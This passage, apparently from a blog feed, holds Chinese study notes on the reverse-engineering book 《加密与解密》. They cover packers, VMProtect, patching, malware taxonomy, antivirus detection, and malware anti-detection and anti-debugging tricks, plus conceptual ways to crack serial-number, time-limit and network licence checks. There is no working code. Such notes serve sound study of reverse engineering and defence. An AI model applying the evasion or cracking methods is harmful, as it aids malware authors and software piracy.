title="汇编编写外壳部分"></a>汇编编写外壳部分</h4><ol><li>外壳加载过程：保留程序入口参数——》dll加载时会多次进入DllMain()需要设计标志——》模拟PE装载器恢复输入表</li><li>自建输入表：通过自建输入表和壳程序本身再将原输入表导入</li><li>外壳引导段：通过call指令将下一句地址入栈，之后pop出地址放入edx，通过edx偏移取变量。该部分主要用于将真正的外壳代码在内存中解压，并初始化一些数据</li><li>外壳第二部分：主要是还原和初始化源程序（主要就是解压和初始化输入表）</li><li>外壳添加到源程序：可以给源程序增加一个独立的区块。需要注意区块的读写属性</li></ol><h3 id="虚拟机设计与VMProtect"><a href="#虚拟机设计与VMProtect" class="headerlink" title="虚拟机设计与VMProtect"></a>虚拟机设计与VMProtect</h3><p>虚拟机保护技术就是将基于x86汇编的代码转换为字节码指令系统的代码。当前主流虚拟机基于栈（字节码指令短，用到的指令少），或是基于寄存器。</p><p>虚拟机启动框架和调用约定</p><ul><li>调度器：VStartVM将所有寄存器符号压栈，esi指向字节码起始地址、ebp指向真实栈、edi指向VMContext。之后生成一个VMDispatcher标签，当每个Handler执行完毕就跳回这里，形成循环</li><li>VMContext：虚拟环境结构，一个结构体其中存放了需要使用的值</li><li>Handler：在虚拟机里面指一小段程序或过程，由VM中的调度器来调用。包括辅助Handler和普通Handler，前者执行重要基本指令，后者用于执行普通x86指令</li><li>标志位问题：应在Handler执行前保存标志位，在相关Handler执行完成后恢复标志位</li><li>异常处理：需要对原有的系统异常处理进行劫持</li></ul><p>需要模拟的x86指令分类，按功能分为</p><ul><li>普通指令：算数、传输指令</li><li>栈指令：push、pop</li><li>流指令：jmp、call、retn等改变程序执行流程（修改esi寄存器）</li><li>不可模拟指令：int 3、sysenter等（对于虚拟机一般只能先退出执行，之后再进入）</li></ul><p>VMProtect以基本块为单位，在原始引擎的代码中插入了无条件跳转和条件跳转，用于分割基本块和生成大量虚假副本</p><div class="table-container"><table><thead><tr><th>基本块名称</th><th>功能</th></tr></thead><tbody><tr><td>VStartVM</td><td>真实环境到虚拟环境的转换，开辟新的堆栈空间给虚拟机</td></tr><tr><td>VMDispatcher</td><td>虚拟指令调度分流</td></tr><tr><td>VHandler</td><td>不同功能的虚拟指令</td></tr><tr><td>VCheckESP</td><td>检查堆栈基本块</td></tr><tr><td>VRet</td><td>该指令将堆栈中压入的寄存器还原到物理寄存器中，之后退出虚拟机环境，切换回到真实的CPU环境</td></tr></tbody></table></div><p>VStartVM执行完毕——》真实寄存器保存到VMP堆栈中——》转到VMDispatcher开始循环执行虚拟指令——》开始的几条虚拟指令将这些值弹出并放到VMContext中。真实CPU寄存器功能</p><div class="table-container"><table><thead><tr><th>寄存器</th><th>功能</th></tr></thead><tbody><tr><td>ESI</td><td>当前要执行的字节码位置，相当于VM.eip</td></tr><tr><td>EDI</td><td>指向VMContext结构</td></tr><tr><td>EBX</td><td>解码虚拟指令时，将执行虚拟基本块的第1条指令赋值给ebx</td></tr><tr><td>EBP</td><td>指向真实的esp</td></tr><tr><td>ESP</td><td>虚拟机使用的堆栈</td></tr></tbody></table></div><p>VMP中指令五大类：元指令（与堆栈相关的指令）、算术运算指令、内存操作指令、系统指令、逻辑运算指令。vJmp—唯一的无条件跳转指令</p><p>对于虚拟机无法处理的指令，VMP会生成推出虚拟机的指令并切换到真实的CPU环境中执行 or 拆分指令联合不同功能的基础指令进行</p><p>虚拟机执行的死规矩</p><ul><li>只能从VMEntry开始执行</li><li>特权指令被虚拟环境接管，模拟执行</li><li>接管内存访问和写入，执行到与内存相关的指令时跳出模拟环境，判断空间是否允许访问</li><li>堆栈操作指令和只能依赖通用寄存器的普通指令可以直接交给系统执行</li></ul><blockquote><p>这里太难了（ToT），下面是VMP还原大致过程（就是目录）</p><p>生成完整的字节码流程图——》给Handler命名并添加语义动作——》将字节码的低级描述转换为中级描述——》清楚无用的字节码——》用真值表花间逻辑指令——》从特征中建立部分寄存器映射信息——》其他无法确定的寄存器的图着色算法——》使用DAG匹配生成指令</p></blockquote><h2 id="软件重构篇"><a href="#软件重构篇" class="headerlink" title="软件重构篇"></a>软件重构篇</h2><h3 id="补丁技术"><a href="#补丁技术" class="headerlink" title="补丁技术"></a>补丁技术</h3><p>补丁分文件补丁和内存补丁两种，前者是修改文件本身的某个数据，后者则是在对正在运行的程序的数据进行修改</p><p>文件补丁较为简单：<code>CreateProcess()</code>打开目标程序——》检查打开的文件是不是目标文件，并检查文件大小——》使用<code>SetFilePointer()</code>将文件指针移动到指定位置——》使用<code>WriteFile()</code>将数据写入到磁盘文件</p><blockquote><p>补丁文件如果有壳、压缩、完整性校验，则文件补丁没办法使用</p></blockquote><p><strong>内存补丁</strong></p><ul><li>跨进程内存存取机制：Loader载入待打补的程序，等待程序运行到需要打补丁的位置，通过<code>WriteProcessMemory()</code>将补丁代码写道目标进程的适当位置</li><li>DebugAPI机制：进程A内部产生异常——》系统监控到异常，将异常信息包装到EXCEPTION_RECORD结构——》查找正在对A调试的进程，并将上一步包装的结构通过EXCEPTION_DEBUG_EVENT发送给找到的进程——》陷入循环的调试进程A收到调试信息，调试进程解析调试信号的信息并进行相应操作。下面是目标进程向调试进程发送调试信息的方法：<ul><li>CreateProcess后目标进程设置为Single Step运行方式，使得每一条指令都要和调试程序通信一次。Intel-CPU中有一个Single Step标志位设置为1即可</li><li>修改目标进程代码，将需要发送调试信息处的指令改为int 3指令</li></ul></li><li>调试寄存器机制：DR0-DR7共8个调试寄存器，在0-3中的一个设置为目标补丁位置，在7中设定相应的控制位。当程序运行到相应位置后CPU就会向调试器发送异常信息，调试器捕获并处理</li><li>dll注入+hook：替换系统dll后劫持输出函数，在自己的函数中进行打补丁操作。</li></ul><p><strong>SMC补丁</strong></p><ul><li><p>SMC即自修改代码，可以对加壳程序直接打补丁，相当于内存补丁</p></li><li><p>单层SMC补丁：当外壳代码完成解压后，让其先跳转到补丁代码处，之后再回到原指令处继续</p><blockquote><p>多层SMC补丁：用于多层嵌套的加密压缩中</p></blockquote></li></ul><p>补丁工具：CodeFusion、dUP等</p><h3 id="代码二次开发"><a href="#代码二次开发" class="headerlink" title="代码二次开发"></a>代码二次开发</h3><p>二次开发就是在已有exe和dll基础上修改扩充PE结构，也叫PEDIY技术</p><ul><li>数据对齐</li><li>增加空间：找空间存放代码<ul><li>区块间隙</li><li>手动构造区块（修正区块表、增加数据段、修正映像文件大小）</li><li>工具辅助构造</li></ul></li><li>获取函数调用信息<ul><li>修改输入表结构增加相应的API函数</li><li>显式链接调用dll相关函数</li></ul></li><li>代码重定位<ul><li>修改重定位表</li><li>代码自定位：利用call指令将返回地址压栈，之后pop将该返回地址取出，实现自定位</li></ul></li><li>增加输出函数：输出表中各输出函数名必须按照字母升序排列</li><li>寻找消息循环<ul><li>程序窗口创建之前必须用<code>RegisterClassA()</code>或<code>RegisterClassExA()</code>来注册窗口（WndProc）类</li><li>用户单击菜单按钮时，系统调用<code>SendMessageA()</code>给应用程序发送WM_COMMAND消息</li><li>用户点击菜单按钮时，会弹出对话框<code>MessageBox()</code>等，可以设置断点拦截</li><li><code>GetWindowLongA()</code>可以获取本进程内窗口的过程</li></ul></li><li>菜单扩展：需要在前面找到的消息循环WndProc中增加消息判断和事件代码，增加的菜单ID不得重复。工具：eXeScope、资源黑客</li><li>DLL扩展：<ul><li>扩展接口：自己写一个dll，在目标程序中输入表添加自己要加的函数，并在消息循环中添加相应的汇编调用代码</li><li>扩展消息循环：在调用原WndProc前，先转到dll处理相关的事件，处理完之后再回去</li></ul></li></ul><blockquote><p>.NET篇与取证篇略过</p></blockquote><h2 id="恶意代码篇？"><a href="#恶意代码篇？" class="headerlink" title="恶意代码篇？"></a>恶意代码篇？</h2><h3 id="恶意代码介绍"><a href="#恶意代码介绍" class="headerlink" title="恶意代码介绍"></a>恶意代码介绍</h3><p>恶意代码，为达到恶意目的而专门设计的代码程序，一切旨在破坏网络系统可靠性、可用性、安全性、数据完整性、消耗系统资源皆是</p><ul><li><p>分类</p><ul><li><p>计算机病毒：需要有宿主，自我复制、破坏宿主功能或毁坏数据</p></li><li><p>蠕虫：可独立运行，自我复制，感染其他计算机</p></li><li><p>木马：不能传播复制的计算机病毒</p></li><li><p>后门：可以使攻击者绕过系统认证机制而直接进入一个系统的方法或手段</p></li><li><p>Rootkit：持久可靠地，目标对象无法检测的，能够维持root权限的程序或代码</p></li><li><p>流氓软件：</p><p>强制安装、浏览器劫持、广告弹出、恶意搜集用户数据、恶意卸载、恶意捆绑</p></li><li><p>僵尸：实现恶意控制的代码</p><p>基于IRC协议、HTTP、P2P</p></li><li><p>Exploit：漏洞利用程序</p><p>主机系统漏洞Exp、文档类漏洞Exp、网页挂马类Exp</p></li><li><p>逻辑炸弹（基于安全保护的措施）、黑客工具、玩笑程序</p></li></ul></li><li><p>危害分类：无危险型(不影响系统)、危险型(影响系统)、伴随型(产生伴随体)、蠕虫型(网络传播、占用内存)、寄生型</p></li><li><p>载体分类：网络病毒、文件病毒、引导性病毒</p></li><li><p>传染方式分类：驻留型病毒、非驻留型病毒</p></li></ul><p><strong>计算机病毒</strong>：</p><ul><li><p><strong>特点</strong>：传染性、非授权性、隐蔽性、不可预见性、潜伏性、可触发性、破坏性；</p></li><li><p>生命周期：开发期-&gt;传染期-&gt;潜伏期-&gt;发作期-&gt;发现期-&gt;消化期-&gt;消亡期；</p></li><li><p><strong>传播途径</strong>：网页挂马、电子邮件+FTP、可移动存储设备、局域网共享、对等网络应用软件、软件漏洞、盗版软件下载、即时通信软件</p></li><li><p><strong>病毒的逻辑结构</strong>：触发模块、传播模块、表现模块</p><p>其他可能有：环境探测模块、自我保护模块、自我卸载模块、自我升级模块</p></li><li><p>触发条件：时间、键盘、感染触发(好几类)、启动、访问磁盘次数触发、CPU型号/主板号；</p></li><li><p>WindowsPE病毒、脚本病毒、宏病毒（Macro）、ELF类病毒；根据是在内存还是磁盘称其为动态和静态</p></li></ul><p><strong>网络蠕虫-Worm</strong>：</p><ul><li><p><strong>特点</strong>：传播速度快、爆发强、无需干预</p></li><li><p><strong>感染阶段</strong>：慢启动期—快速传播期—慢结束期—衰亡期</p></li><li><p><strong>行为特征</strong>：主动攻击、行踪隐蔽、利用网络或系统应用服务漏洞</p></li><li><p><strong>危害</strong>：网络阻塞、降低系统性能、产生安全隐患、反复性、破坏性</p></li><li><p><strong>结构</strong>：信息搜集模块+扫描探测模块+攻击渗透模块+自我推进模块</p><p>扩展：实体隐藏模块、宿主破坏模块、信息通信模块、远程控制模块、自动升级模块</p></li></ul><p>影响其传播速度的因素：目标漏洞发现速度、可利用漏洞数、感染速度</p><ul><li><p><strong>扫描策略</strong>：选择性随机扫描、顺序扫描、基于目标列表的扫描、基于路由的扫描、基于DNS扫描、分治扫描（多个蠕虫协作）、被动式扫描（等鱼上钩）</p></li><li><p><strong>漏洞利用技术</strong>：目标主机的程序漏洞、主机之间的信任关系漏洞、弱口令漏洞</p></li><li><p><strong>检测与防治</strong>：</p><ol><li><p>主机角度：及时修补补丁、防火墙、安软</p></li><li><p>网络角度：</p><p>检测：漏洞利用特征检测、网络流量分析、数据特征；</p><p>措施：网关阻断、补丁推送、良性蠕虫（WAW模型）</p></li></ol></li></ul><p><strong>木马-Trojan</strong>：</p><ul><li><p>特性：欺骗性、隐蔽性、非授权性、交互性</p></li><li><p>按功能分：</p><p>远程控制木马：上兴、灰鸽子</p><p>信息获取木马：Torjan-Bank、Torjan-Spy、Torjan-PSW</p><p>破坏性木马：Torjan-DDOS、Torjan-Ransom、Torjan-ArcBomb</p></li><li><p><strong>远控型木马结构</strong>：木马配置程序、控制端程序、被控端程序</p></li><li><p>客户端与受害者<strong>连接方式</strong>：</p><p>正向连接（数据包溯源）、反向连接（木马样本查看服务端）、借助第三方的反向连接</p></li><li><p><strong>通信方式</strong>：TCP通信、UDP通信、ICMP通信（ping）、HTTP隧道</p></li><li><p><strong>主要功能</strong>：隐藏功能、自启动功能、通信功能、卸载功能</p><p>可选：进程管理、文件管理、注册表操作、服务管理、屏幕截取、鼠标控制、视频监视、语音监听、键盘记录、远程shell、传播病毒、破坏系统、添加后门等</p></li></ul><p><strong>Rootkit</strong>：</p><p>关键在于隐藏、无法被检测；下面是一些常用的Rootkit技术（win）</p><ul><li><p>用户态HOOK-在操作系统的用户态实行的挂钩，主要钩挂用户态APi</p><ol><li>IAT（导入地址表）钩子：改变IAT表项的值，使其指向HOOK函数</li><li>内联钩子inlineHoooook</li></ol></li><li><p>内核态HOOK</p><ol><li><p>IDT（中断描述符表）钩子</p></li><li><p>SSDT（系统服务调度表）钩子</p><blockquote><p>SSDT在NT系统中相当于DOS中的中断向量表，有关键API入口指针</p></blockquote></li><li><p>过滤驱动程序</p></li><li><p>驱动程序钩子</p></li></ol></li><li><p>直接内核对象操作（DKOM）</p></li><li><p>检测工具：IceSword、XueTr</p></li></ul><p><strong>手机恶意软件</strong>：</p><ul><li><p>Android：以Linux为基础的半开源OS，从高到低分为四层：应用程序层-应用程序框架层-系统运行库层-linux内核层；SDK提供Java的API，NDK允许使用C/C++开发</p></li><li><p>恶意软件种类：木马Torjan、间谍软件Spyware、蠕虫Worm、感染型病毒Virus、破坏性程序HarmTool</p></li><li><p>隐私窃取：</p><ol><li>基于Content Provider：使用<code>ContentResolver</code>的<code>query()</code>方法、<code>Activity</code>对象的<code>manageQuery()</code>方法</li><li>基于Manager API：<code>TelephonyManager</code>类提供用于访问与手机通讯相关状态和信息的方法；<code>LocationManager</code>类提供地理位置；<code>PackageManager</code>类管理应用程序包，获取应用信息</li><li>基于广播接收器：广播机制能够自动进行事件通知和函数回调</li></ol></li></ul><hr><h3 id="病毒检测"><a href="#病毒检测" class="headerlink" title="病毒检测"></a>病毒检测</h3><ul><li><strong>病毒特征值检测技术</strong>：</li></ul><p>特征值：一串二进制值，可以是病毒本身的感染标识（病毒识别此标识用于防止重复感染），也可以是其他独一无二的值</p><p>关键组件：病毒检测引擎、病毒特征库</p><p>实现步骤：</p><ol><li>采集病毒样本：即使同一病毒，不同宿主时仍要采集</li><li>病毒样本提取特征值：病毒标识、感染信息、（理论上）任何地方开始连续的且不含空格的（ASCII的32）连续64字节，等均可作为特征值</li><li>将特征值纳入特征数据库</li></ol><p>由于病毒变种，自我更新等技术，需要采用多模式匹配的检测引擎，较为通用的多模式匹配算法有AC算法、AC-BM算法、WM算法</p><ul><li><strong>校验和检测技术</strong>：</li></ul><p>先保存正常时的文件和系统扇区的校验和（MD5、CRC），并存入数据库，之后每次使用开启时就再次验算对比；</p><p>使用方式：病毒检测工具中植入、各个应用程序自检、专门程序常驻内存</p><p>常校验对象：</p><ol><li>系统对象：硬盘主引导扇区、OS引导扇区、中断向量表、API函数、设备驱动程序头部</li><li>文件头部：病毒在宿主程序前面好说，在后面则必然会更改第一条指令来让其跳转到病毒代码</li><li>文件基本属性：长度、时间、属性、首簇号、特定内容</li><li>文件校验和：文件内容的全部字节</li></ol><ul><li><strong>虚拟机检测技术</strong>：</li></ul><p>也叫做软件模拟法，为对抗病毒的多态和变形技术</p><p>多态病毒对自身二进制文件进行加密运行时再自解密，每次感染都会改变其密钥和解密代码</p><p>变形病毒每次感染都会对自身代码进行整体变形，特征值检测无效</p><p>杀软先检测特征值，如果发现上述病毒就启动软件模拟来监视病毒运行，待解码后再次识别病毒</p><p>虚拟机设计方案：</p><ol><li>自含代码虚拟机SCCE：like a full CPU</li><li>缓冲代码虚拟机BCE：对特殊指令进行模拟，其他的则简单处理</li><li>有限代码虚拟机LCE：跟踪改变内存或寄存器</li></ol><ul><li><strong>启发式扫描技术</strong>：</li></ul><p>带入人的经验，先分析文件中的指令序列，然后依规律判断文件是否感染。</p><p>如常规程序：绘制窗口—初始化界面—开启消息循环</p><p>病毒：重定位—远距离跳转—搬移代码—写盘—解码—搜索可执行程序。</p><p>注意需要进行加权，以降低误报</p><ul><li><strong>主动防御技术</strong>：</li></ul><p>又叫做行为实时监控技术</p><p>常见病毒行为（不排除安全软件）：</p><ol><li>对可执行文件进行写操作</li><li>对关键性的系统设置进行修改；如启动项，注册表<code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run</code>建立自启动项</li><li>加载驱动：Rootkit</li><li>创建远程线程：win的API<code>CreateRemoteThread</code>来创建远程线程</li></ol><p>主动防御：关键技术API-HOOK，跟踪程序的所有API调用来初步分析一个程序的行为，严重依赖于检测算法</p><hr><h3 id="病毒检测对抗与自我保护"><a href="#病毒检测对抗与自我保护" class="headerlink" title="病毒检测对抗与自我保护"></a>病毒检测对抗与自我保护</h3><ul><li><p>特征值检测对抗：</p><ol><li>代码加密混淆：加密，增加花指令等</li><li>加壳：压缩壳、保护壳</li><li>特征值针对修改：代码入口修改、垃圾代码nop插入、指令等价交换、字串修改、多次跳转、函数引入和引出表、重定位调整、PE文件结构调整、SMC代码自修改</li></ol></li><li><p>虚拟机检测对抗：</p><p>使用特殊指令技术、结构化异常处理技术、人口点模糊（EPO）技术、多线程技术、使用API调用、长循环等</p><p>虚拟机环境检测、仿真环境干扰技术、调式检测技术（检测进程环境块PEB中的<code>BeingDebugged</code>标志）<code>IsDebuggerPresent()</code>API会检查该标志以确定用户是否正在被用户模式的调试器调试</p></li><li><p>启发式扫描对抗：</p><p>新的PE文件感染技术、多节病毒、加密宿主文件头、感染第一节的闲置区域、压缩感染首节、入口点隐藏、随即入口点、重新计算校验和、不使用API字符串、文件头中修改代码大小等</p></li><li><p>主动防御对抗：</p><p>将SSDT表项恢复（需要0层权限）、不使用HOOK过的API</p></li><li><p>对抗云查杀：</p><p>修改本地host文件，不让上传；病毒运行时临时性断网、增肥超限制大小不让上传</p></li><li><p>恶意程序的主动保护机制：</p><ol><li>消灭反病毒程序、防火墙等</li><li>阻断并独占文件来防止检查</li><li>修改hosts文件防止杀软升级</li><li>检测安全软件询问消息、使安全软件过期（针对收费的）</li></ol></li><li><p>人工分析对抗：</p><ol><li><p>静态分析对抗：花指令、自修改代码技术实现（SMC）、加密与多态变形、虚拟机保护技术（壳）</p><blockquote><p>反汇编算法主要有线性扫描算法、递归扫描算法；前者依次将每个模块中的指令反汇编，并没有对内容进行判断，无法正确地将代码和数据分开；后者模拟CPU执行过程，依据控制流对可能的路径扫描</p></blockquote></li><li><p>动态分析对抗—检测是否处于调试状态</p><ul><li>调用特定函数<code>IsDebuggerPresent()</code>、<code>CheckRemoteDebuggerPresent()</code>、<code>NtQueryInformationProcess()</code></li><li>检测<code>PEB.NtGlobalFlag</code>、<code>Heap。HeapFlags</code>、<code>Heap.FroceFlags</code>、<code>TRAPFLAG</code>等标记</li><li>检测调试器对特定指令的特殊处理方式是否与常规状态下有差别</li><li>检测执行时间差：汇编<code>RDTSC</code>、API函数<code>GetTickCount()</code></li><li>调试器后门、调试器对系统部分功能地接管、父进程检测、<code>StartupInfo</code>结构检测</li></ul></li><li><p>动态对抗—检测调试器软件是否存在</p><ul><li>查找进程或文件特征码、特定服务</li><li>句柄检测、<code>DBGHELP</code>模块检测、<code>SeDebugPrivilege</code>方法</li><li>查找调试器窗口：<code>FindWindows()</code>、<code>EnumWindow()</code>、<code>GetGroundWindow()</code>函数</li></ul></li><li><p>动态对抗—发现调试器：改变后续代码逻辑或退出—<code>ExitProcess()</code>、关闭调试器、干扰调试器—<code>SetWindowLong()</code>改变窗口属性</p></li></ol></li></ul><p><strong>壳技术</strong>：在一个程序外面套上另一段代码，保护里面的代码不被非法修改或者反编译的程序；一般先于程序运行，对原始程序进行解密还原，之后再将控制权交给源程序。可以是EXE、DLL，源程序照常使用，只是相当于用户运行了壳，壳其中运行目标程序。具体如下：</p><ol><li>保存入口参数</li><li>获取壳自己需要的API地址</li><li>解密原程序的各个区块</li><li>重定位</li><li>修复引入函数地址表</li><li>跳转到程序入口点OEP</li></ol><div class="table-container"><table><thead><tr><th>壳</th><th>介绍</th></tr></thead><tbody><tr><td>Upx、Neolite</td><td>高效压缩，内置压缩和解压缩</td></tr><tr><td>ASpack、Petite、PECompact、Shrinker</td><td>有保护性的压缩，不内置解压缩</td></tr><tr><td>幻影、PC_Guard、Krypton、Armadillo</td><td>有保护性的加密壳</td></tr><tr><td>ASProtect、tElock</td><td>有高效保护性的加密压缩壳</td></tr></tbody></table></div><p>自动脱壳：主要脱压缩壳，工具<code>Quick Unpack</code>、<code>File Scanner</code>、<code>PEiD</code></p><p>手动：基本原理，模拟虚拟机进行脱壳，之后从内存转存（Dump）。Dump软件LordPE、ProcDump、PETools。过程：寻找OEP—Dump—重建输入表</p><hr><h3 id="恶意代码分析"><a href="#恶意代码分析" class="headerlink" title="恶意代码分析"></a>恶意代码分析</h3><p>捕获：蜜罐、用户上报、云平台上传、诱饵邮箱、样本交流</p><p>分析过程：</p><ol><li><p>虚拟机环境准备</p></li><li><p>系统监控：</p><ul><li><p>进程监控：进程名+PID+路径+子进程+相关句柄模块；</p><p>工具-Process Explorer、PrcView等</p></li><li><p>文件监控：读写行为；工具FileMon</p></li><li><p>注册表监控：键的添加删除等；工具RegMon、PCLogger</p></li><li><p>网络连接分析：工具FPort、TcpView</p></li><li><p>系统自启动项分析：工具<code>msconfig</code>命令、AutoRun</p></li><li><p>内核监控：工具PC_Hunter、IceSword</p></li><li><p>完整性检测：工具Regsnap、RegShot、Sentinel、Fingerprint</p></li></ul></li><li><p>文件类型侦测：工具PEiD、FileInfo</p></li><li><p>PE文件格式分析：工具PEView、Study_PE</p></li><li><p>静态反汇编：工具IDA、Hoppe、C32ASM、Ghidra</p></li><li><p>动态反汇编：工具Ollydbg、SoftIce、WinDbg、x96dbg</p></li><li><p>文本16进制分析：工具winhex、UltraEdit、01Editor</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> 读书笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> OS </tag>
            
            <tag> Windows </tag>
            
            <tag> Re </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>《加密与解密》读书笔记1</title>
      <link href="/2024/04/27/%E5%8A%A0%E8%A7%A3%E5%AF%86/"/>
      <url>/2024/04/27/%E5%8A%A0%E8%A7%A3%E5%AF%86/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h2 id="基础篇"><a href="#基础篇" class="headerlink" title="基础篇"></a>基础篇</h2><p>API即应用程序编程接口，WinAPI子系统负责将API调用转换成Windows操作系统的系统服务调用，其下面就是Windows核心，上面是各种应用程序。</p><p>WinNT，也就是当前居多的XP/7/10等，在其上面的16位API都会通过一个转换层换为Win32函数调用，之后被操作系统处理。</p><p>WinNT中，DLL通常位于<code>\SYSTEM</code>和<code>\SYSTEM32</code>子目录中。winNT内核仅接受Unicode字符</p><blockquote><p>在winAPI中，A表示ANSI字符即单字节，W表示宽字符。A版的一般都会先转为W再给内存处理，会慢一点</p></blockquote><p>Windows主要部分在三个动态链接库中实现</p><ul><li>kernel（kernel32.dll）操作系统核心功能服务，包括进程线程控制、内存管理、文件访问等</li><li>User（USER32.dll）负责用户接口，包括键盘鼠标输入、窗口和菜单管理等</li><li>GDI（GDI32.dll）图形设备接口，允许程序在屏幕上显示文本和图形</li><li>注册表操作（AFVAPI32.dll）；通用控件（COMCTL32.dll）；公共对话框（COMDLG32.dll）；用户界面外壳（SHELL32.dll）；网络（NETAPI32.dll）</li></ul><p>WOW64：在64位的win上运行的32位子系统。64位系统文件放在<code>System32</code>文件夹下，<code>SysWOW64</code>则是存放的32位系统文件。64位的程序加载<code>System32</code>下的64位dll，当32位程序加载时WOW64会建立32位ntdll.dll的启动环境，并切换CPU模式为32位。</p><blockquote><p>WOW64通过将32位ntdll.dll重定向到64位的，发出对应的64位系统调用，返回时再转为32位</p><p>天堂之门：<a href="https://bbs.kanxue.com/thread-270153.htm">[原创]天堂之门 (Heaven’s Gate) C语言实现-软件逆向-看雪-安全社区|安全招聘|kanxue.com</a></p></blockquote><p>消息机制：windows是消息驱动式系统，消息提供与程序与程序之间、程序与系统之间。包括两种队列，系统消息队列和程序消息队列。当事件发生时由windows先放入系统消息队列，之后再复制到相应的程序队列中（非抢占，除部分系统消息基本都是先来先开）</p><h2 id="调试篇"><a href="#调试篇" class="headerlink" title="调试篇"></a>调试篇</h2><blockquote><p>这篇主要在于工具的使用，这里随笔带过</p></blockquote><p>动态分析工具：Ollydbg、MDebug、x96dbg、windbg</p><p>反汇编引擎：ODDisasm（OD）、BeaEngine、Udis86、Capstone、AsmJit、Keystone、XDE、LDasm等</p><ul><li>性能Udis86&gt;BeaEngine&gt;Capstone</li><li>解码能力：Capstone&gt;BeaEngine&gt;Udis86</li><li>平台支持：Capstone&gt;Udis86=BeaEngine</li><li>x86扩展指令：Capstone&gt;Udis86=BeaEngine</li></ul><p>十六进制工具：HexWorkshop、Winhex、Hiew</p><h2 id="解密篇"><a href="#解密篇" class="headerlink" title="解密篇"></a>解密篇</h2><blockquote><p>逆向分析技术内容与《C++反汇编》大致相同，这里不多介绍</p></blockquote><h4 id="演示版保护技术"><a href="#演示版保护技术" class="headerlink" title="演示版保护技术"></a>演示版保护技术</h4><ul><li><p>序列号保护机制</p><ol><li>用户名做变量，函数F变换得到注册码</li><li>注册码验证用户名正确性</li><li>对等函数检查注册码，F1(用户名)=F2(注册码)</li><li>同时将用户名注册码作为自变量</li></ol><ul><li>攻击思路：消息断点、提示信息、字符串比较</li></ul></li><li><p>警告窗口：eXeScope、Resource Hacker等工具打开对话框，可以设置屏蔽或者消息断点</p></li><li><p>时限：</p><ul><li>计时器：每次使用时间固定<code>setTimer()</code>、多媒体计时器、<code>GetTickCount()</code>、<code>timeGetTime()</code>等函数</li><li>天数限制：一个是安装时间，另一个是最近运行时间（可能会与当前系统时间进行比较）</li><li>破解思路：跳过有关函数，或者利用函数的参数进行更换，再或者变速齿轮更改时间</li></ul></li><li><p>菜单功能限制：一种是代码就不全（除了自己写没啥办法）；另一种是窗口变灰，有关函数<code>EnableMenuItem()</code>、<code>EnableWindow()</code></p></li><li><p>KeyFile：付费后发给一个小文件，其中包含垃圾信息和有用数据。破解思路一般跟踪文件读取等API函数，监视操作等</p></li><li><p>网络验证：抓包，本地模拟服务端，根据发送的包跟踪有关函数</p></li><li><p>光盘：刻录复制光盘，虚拟光盘模拟</p></li></ul><h4 id="加密算法"><a href="#加密算法" class="headerlink" title="加密算法"></a>加密算法</h4><blockquote><p>加密算法部分在密码学有关文章中有部分说明，这里仅补充</p></blockquote><p>单向散列函数，也叫hash算法，不可逆，可用于数字签名完整性检验等</p><ul><li><p>SHA算法，安全散列函数，包括sha1、sha256、sha384、sha512四种，分别产生160位、256位、384位、512位散列值</p></li><li><p>该算法系列会有初始散列值H用以进行初始化，SHA-1中：<code>H0=67452301h</code>、<code>H1=EFCDAB89h</code>、<code>H2=98BADCFEh</code>、<code>H3=10325476h</code>、<code>H4=C3D2E1F0h</code>可以作为特征进行识别</p></li></ul><p>对称加密算法，即加解密密钥相同</p><ul><li>BlowFish算法是一个64位分组及可变密钥长度的分组密码算法。</li><li>加密函数迭代执行16轮，分组长度为64位，密钥长度32位到448位。包括密钥扩展部分和数据加密部分<ul><li>密钥扩展：密钥转换为4168B的子密钥数组</li><li>数据加密：16轮的Feistel网络结构完成，每一轮由一个密钥相关置换和替换组成</li></ul></li></ul><p>公开密钥加密算法：加解密时使用不同的密钥。都基于NP问题进行设计，常见的有RSA、ElGamal、ECC（椭圆曲线）、DSA数字签名算法</p><p>常见加密库接口及识别</p><ul><li>Miracl：多精度整数和有理数算数运算库。<code>MR_IN(xx)</code>是该库的错误处理机制，用来表示Miracl中的函数以及退出代码，每个函数的xx都不同</li><li>FGInt：以$2^{31}$进制表示大数。PEiD中的<code>Krypto ANALyzer</code>插件可识别有关函数</li><li>其他加密算法库：freeLIP、Crypto++、LibTomCrypt、GMP、OpenSSL、DCP、DEC、NTL等</li></ul><h2 id="系统篇"><a href="#系统篇" class="headerlink" title="系统篇"></a>系统篇</h2><p>非常难！！！！好多看不懂！！！</p><h3 id="windows内核基础"><a href="#windows内核基础" class="headerlink" title="windows内核基础"></a>windows内核基础</h3><blockquote><p>内核在这本书中包括内核本身和以内核模块方式加载的驱动文件</p></blockquote><p>CPU设计之初是让R0运行内核，R1和R2运行设备驱动，R3运行程序。但实际是设备驱动与内核运行在R0级别，其余的在R3级别</p><p><strong>HAL</strong>：硬件抽象层，一个可加载的核心模块HAL.dll，它为系统上的硬件平台提供低级接口。在用户层导出NTDLL.dll通过win32API或其他子环境对其访问</p><p><strong>内存空间布局</strong>：</p><ul><li>在32位下，windows内存2GB内核空间与应用层空间，其中还有两个64KB大小的NULL空间和非法区域</li><li>64位下，除了上述空间外还有部分空洞。而且一般64位系统不会全用完，目前都是&lt;50位</li><li>逻辑地址=段选择符+偏移地址。CPU先通过分段机制计算出一个线性地址，之后再通过页表机制将线性地址映射到物理地址，从而获取内存中的数据指令</li></ul><p><strong>windows与内核启动</strong>：</p><ol><li>启动自检：BIOS中载入必要指令，进行自检，硬件初始化，同时在屏幕上显示信息</li><li>初始化启动：自检完后根据CMOS设置，BIOS加载启动盘，将MBR中的引导代码加载到内存，之后控制权交给MBR，搜索其中的分区表并找出活动分区，将第一个扇区中的引导代码载入内存。引导代码检测当前文件系统，查找并启动ntldr文件，转交控制权。（win7后一般是Bootmgr）</li><li>Boot加载：对ntldr有如下设置<ul><li>设置内存模式，32/64位</li><li>启动一个简单的文件系统，定位boot.ini等启动文件</li><li>读取boot.ini文件</li></ul></li><li>检测配置硬件</li><li>内核加载阶段：<ul><li>ntldr首先加载Windows内核Ntoskrnl.exe和硬件抽象层。后者对硬件底层进行隔离，转换为调用接口。</li><li>ntldr从注册表<code>HKEY_LOCAL_MACHINE\System\CurrentControlSet</code>下读取已安装的驱动程序，然后依次加载驱动</li><li>初始化驱动，<code>HKEY_LOCAL_MACHINE\System\CurrentC